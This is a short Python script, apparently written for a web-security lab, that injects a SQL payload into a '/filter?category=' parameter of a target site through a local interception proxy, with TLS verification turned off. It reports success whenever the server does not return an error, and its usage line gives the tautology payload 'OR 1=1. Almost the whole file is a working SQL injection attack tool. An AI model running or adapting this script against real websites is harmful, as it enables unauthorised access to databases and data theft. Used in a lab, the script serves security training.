import requests
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
	'http': 'http://127.0.0.1:8080',
	'https': 'https://127.0.0.1:8080'
}


def exploit_sqli(url, payload):
	uri = '/filter?category=?'
	req = requests.get(url + uri + payload, proxies=proxies, verify=False)
	if req.status_code == 500:
		return False
	else:
		return True


if __name__ == '__main__':
	try:
		url = sys.argv[1].strip('/')
		payload = sys.argv[2].strip()
	except IndexError:
		print("[-] Usage: %s <url> <payload>" % sys.argv[0])
		print("[-] Example: %s http://example.com/ 'OR 1=1" % sys.argv[0])
		sys.exit(-1)

	if exploit_sqli(url, payload):
		print("[+] SQL injection successful")
	else:
		print("[-] SQL injection failed")
